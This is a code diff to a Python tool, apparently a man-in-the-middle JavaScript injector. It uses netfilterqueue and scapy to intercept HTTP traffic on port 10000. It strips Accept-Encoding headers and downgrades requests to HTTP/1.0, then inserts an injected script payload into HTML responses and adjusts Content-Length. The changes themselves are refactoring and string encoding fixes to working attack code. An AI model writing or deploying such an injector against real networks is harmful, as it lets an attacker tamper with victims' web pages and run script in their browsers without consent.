@@ -10,10 +10,11 @@ Allocates HTTP Txs into a queue. Isolates HTTP raw load layer,
 matches encoding against a regex and supplants with an empty str
 to elicit plaintext HTML response, which enables JS injection.
 """
+import re
 import subprocess
 import netfilterqueue
 import scapy.all as scapy
-import re
+from scapy.layers.inet import IP, TCP
 from utils.instantiate_queue import instantiate_queue
 
 ENCODING_REGEX = "Accept-Encoding:.*?\\r\\n"
@@ -33,9 +34,9 @@ class Injector:
         returns said modified response.
         """
         packet[scapy.Raw].load = load
-        del packet[scapy.IP].len
-        del packet[scapy.IP].chksum
-        del packet[scapy.TCP].chksum
+        del packet[IP].len
+        del packet[IP].chksum
+        del packet[TCP].chksum
         return packet
 
     def process_packet(self, packet): 
@@ -47,18 +48,18 @@ class Injector:
         ...
         """
         # wrap payload packet in Scapy IP layer
-        scapy_packet_obj = scapy.IP(packet.get_payload())
+        scapy_packet_obj = IP(packet.get_payload())
         if (scapy_packet_obj.haslayer(scapy.Raw)):
-            load = scapy_packet_obj[scapy.Raw].load
+            load = scapy_packet_obj[scapy.Raw].load.decode()
             # request obj
-            if (scapy_packet_obj[scapy.TCP].dport == 10000):
+            if (scapy_packet_obj[TCP].dport == 10000):
                 print("[+] Request")
                 # remove Encoding header to force resolution of HTML to UTF-8
                 load = re.sub(ENCODING_REGEX, "", load)
                 # downgrade to 1.0 to avoid chunks proc exception
                 load = load.replace("HTTP/1.1" , "HTTP/1.0")
             # response obj
-            elif (scapy_packet_obj[scapy.TCP].sport == 10000): 
+            elif (scapy_packet_obj[TCP].sport == 10000): 
                 print("[+] Response")
                 content_len_grp = re.search(LEN_REGEX, load)
                 load = load.replace(INJECTION_REGEX, self.payload + INJECTION_REGEX)
@@ -67,7 +68,8 @@ class Injector:
                     content_len = content_len_grp.group(1)
                     new_content_len = int(content_len) + len(self.payload)
                     load = load.replace(content_len, str(new_content_len))
-
+            load = load.encode()
+            # did we tamper with it?
             if (load != scapy_packet_obj[scapy.Raw].load):
                 generated_packet = self.generate_load(scapy_packet_obj, load)
                 packet.set_payload(str(generated_packet))
